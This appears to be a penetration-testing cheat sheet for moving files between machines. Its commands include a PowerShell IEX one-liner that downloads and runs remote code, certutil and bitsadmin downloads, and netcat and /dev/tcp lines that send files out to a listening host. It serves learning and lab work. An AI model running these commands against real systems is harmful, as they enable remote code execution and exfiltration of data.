# File transfer: Overview

## Host files

### SimpleHTTPServer

Start http server in current dir
```bash
python -m SimpleHTTPServer <port>
```

### Apache

Start apache
```bash
sudo systemctl start apache2
```
Default directory `/var/www/html`

### SMB

smbserver.py (impacket)
```bash
sudo impacket-smbserver <share-name> <local-folder>
```

### FTP

* [Pure-FTPd](/XX-file-transfer/03-pure-ftpd.md)
* [TFTP](/XX-file-transfer/04-tftp.md)

## Download files

### wget

```bash
wget <ip>:<port>/file.txt
```
See also [Wget](/XX-file-transfer/02-wget.md)

### curl

```bash
curl -O http://host/file.txt
```

### PowerShell

```bash
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt', 'C:\tmp\file.txt')"
```

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<host>/<file>')"
```

### certutil

```bash
certutil.exe -urlcache -split -f http://<host>/<file> <file>
```

### VBScript

See [VBScript: Wget clone](/XX-file-transfer/05-vbscript-wget-clone.md)

### BITSAdmin

```bash
bitsadmin /transfer mydownloadjob /download /priority normal <url> <destination>
```

## Send/retrieve files

### netcat

```bash
nc -nlvp <port> > file
```

```bash
nc -nv <own-ip> <port> < file
```
Note: There is no feedback about the progress, or when/if the upload finished.

### cat

```bash
cat <file> > /dev/tcp/<ip>/<port>
```

```bash
nc -lvnp <port> > <file>
```
